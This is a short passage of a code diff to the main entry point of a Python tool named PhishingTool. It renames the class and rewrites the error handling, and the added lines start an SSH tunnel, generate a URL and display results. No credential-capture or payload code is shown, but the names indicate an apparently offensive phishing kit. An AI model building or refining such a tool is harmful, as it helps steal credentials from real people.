+            if self.start_ssh_tunnel():
+                if self.generate_url():
+                    self.display_results()
+                    self.wait_for_services()
+            else:
+                self.print_color("[-] Failed to start tunnel", Colors.RED)
 
 def main():
-    """Main entry point with enhanced error handling"""
+    """Main entry point"""
+    tool = PhishingTool()
     try:
-        tool = AdvancedPhishingTool()
-        tool.main_loop()
+        tool.main()
     except KeyboardInterrupt:
-        print(f"\n{Colors.RED}[!] Tool interrupted by user{Colors.NC}")
+        tool.cleanup()
     except Exception as e:
-        print(f"{Colors.RED}[CRITICAL ERROR] {str(e)}{Colors.NC}")
-        print(f"{Colors.YELLOW}[!] Please check the log file: phishing_debug.log{Colors.NC}")
-    finally:
-        # Ensure cleanup happens
-        if 'tool' in locals():
-            tool.cleanup()
+        print(f"{Colors.RED}[-] Unexpected error: {str(e)}{Colors.NC}")
+        tool.cleanup()
 
 if __name__ == "__main__":
     main()
